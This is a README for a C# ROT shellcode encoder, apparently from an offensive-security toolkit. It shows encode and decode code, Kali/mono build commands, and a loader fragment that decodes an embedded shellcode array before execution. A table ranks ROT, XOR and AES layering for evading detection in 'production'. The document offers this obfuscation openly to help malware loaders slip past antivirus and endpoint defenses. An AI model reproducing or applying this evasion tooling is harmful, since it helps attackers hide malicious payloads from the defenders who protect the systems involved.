# ROT Shellcode Encoder

ROT (rotation) encoding shifts each shellcode byte by a fixed amount. Encode on Kali, decode at runtime in the loader. Simple and fast — useful as a secondary obfuscation layer on top of XOR or AES.

---

## Files

The Visual Studio project in this directory contains `Program.cs` — a C# ROT encoder.

**How it works:**
```csharp
// Encode: add rotNo to each byte (wraps at 256)
encoded[i] = (byte)(((uint)buf[i] + rotNo) & 0xFF);

// Decode: subtract rotNo at runtime
decoded[i] = (byte)(((uint)buf[i] - rotNo) & 0xFF);
```

---

## Build and run

```bash
# Build with msbuild (Windows) or compile Program.cs
# Input: raw shellcode file (shell.bin)
# Output: ROT-encoded byte array printed to console

# Or use on Kali with mono:
mcs Program.cs -out:rot-encoder.exe
mono rot-encoder.exe shell.bin 13
```

---

## In a C# loader

```csharp
// Paste the ROT-encoded array from the encoder output:
byte[] buf = new byte[] { 0x09, 0x55, 0x90, ... };

// Decode before execution:
byte rotNo = 13;   // must match what you encoded with
for (int i = 0; i < buf.Length; i++)
    buf[i] = (byte)(((uint)buf[i] - rotNo) & 0xFF);

// Execute buf...
```

---

## When to use ROT vs XOR vs AES

| | ROT | XOR | AES |
|--|-----|-----|-----|
| Key space | 255 values | 255 values (single) | 2^256 |
| Speed | Fastest | Fast | Moderate |
| Detection resistance | Low | Medium | High |
| Use case | Layer on top of AES | Standalone simple evasion | Production evasion |

ROT is not meant to be used alone. Layer it: AES-encrypt the shellcode, then ROT-encode the AES-encrypted bytes. The decoder reverses ROT first, then AES-decrypts.
